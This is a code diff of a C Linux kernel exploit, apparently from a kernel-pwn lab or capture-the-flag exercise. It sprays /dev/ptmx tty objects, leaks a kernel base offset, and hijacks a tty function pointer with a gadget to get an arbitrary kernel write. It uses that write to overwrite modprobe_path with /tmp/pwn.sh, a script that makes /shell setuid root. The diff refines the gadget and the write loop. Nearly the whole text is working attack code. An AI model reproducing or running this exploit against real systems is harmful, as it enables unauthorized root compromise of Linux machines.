@@ -6,7 +6,9 @@
 #include <sys/ioctl.h>
 #include <unistd.h>
 
+int fd;
 int tty[100];
+int target = 0;
 
 uintptr_t offset;
 #define OFFSET(addr) (addr + offset)
@@ -14,9 +16,9 @@ uintptr_t offset;
 uintptr_t g_buf;
 
 uintptr_t modprobe_path	= 0xffffffff81e38180;
-uintptr_t mov_prdx_rcx	= 0xffffffff811b7dd6;
+uintptr_t mov_prdx_ecx	= 0xffffffff814b27c2;
 
-static void leak_offset_and_g_buf(int fd)
+static void leak_offset_and_g_buf(void)
 {
 	uint8_t data[0x440];
 
@@ -28,31 +30,43 @@ static void leak_offset_and_g_buf(int fd)
 	printf("[+] g_buf %p\n", g_buf);
 }
 
-static void aaw(int fd, uintptr_t ptr, uint8_t *buf, size_t count)
+static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
 {
 	uint8_t data[0x420];
-	size_t left = count;
+	size_t left = len;
 	uint32_t tmp;
 
 	read(fd, data, 0x420);
-	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_prdx_rcx);
+	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_prdx_ecx);
 	*(uintptr_t *)&data[0x418] = g_buf;
 
 	write(fd, data, 0x420);
 
-	for (int i = 0; i < count; i += 4, left -= 4) {
-		tmp = 0;
-		memcpy(&tmp, buf + i, left >= 4 ? 4 : left);
+	for (int i = 0; i < len; i += 4, left -= 4) {
+		if (left >= 4) {
+			tmp = *(uint32_t *)(buf + i);
+		} else {
+			tmp = 0;
+			for (int i = 0; i < left; ++i)
+				tmp |= (uint32_t)(*(uint8_t *)(buf + i))
+				       << (3 - i) * 8;
+		}
 
-		for (int j = 0; j < 100; ++j)
-			ioctl(tty[j], tmp, ptr + i);
+		if (target) {
+			ioctl(target, tmp, ptr + i);
+		} else {
+			for (int j = 0; j < 100; ++j) {
+				if (ioctl(tty[j], tmp, ptr + i) != -1) {
+					target = tty[j];
+					break;
+				}
+			}
+		}
 	}
 }
 
 int main(void)
 {
-	int fd;
-
 	for (int i = 0; i < 50; ++i) {
 		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
 		if (tty[i] == -1) {
@@ -75,18 +89,18 @@ int main(void)
 		}
 	}
 
-	leak_offset_and_g_buf(fd);
+	leak_offset_and_g_buf();
 
-	uint8_t evil[] = "/tmp/evil.sh";
-	aaw(fd, OFFSET(modprobe_path), evil, sizeof(evil));
+	uint8_t evil[] = "/tmp/pwn.sh";
+	aaw(OFFSET(modprobe_path), evil, sizeof(evil));
 
 	system("echo -e '"
 	       "#!/bin/sh\n"
 	       "chown root:root /shell\n"
 	       "chmod 6777 /shell"
 	       "'"
-	       ">/tmp/evil.sh");
-	system("chmod +x /tmp/evil.sh");
+	       ">/tmp/pwn.sh");
+	system("chmod +x /tmp/pwn.sh");
 	system("echo -e '\xff\xff\xff\xff' > /tmp/pwn");
 	system("chmod +x /tmp/pwn");
 	system("/tmp/pwn");
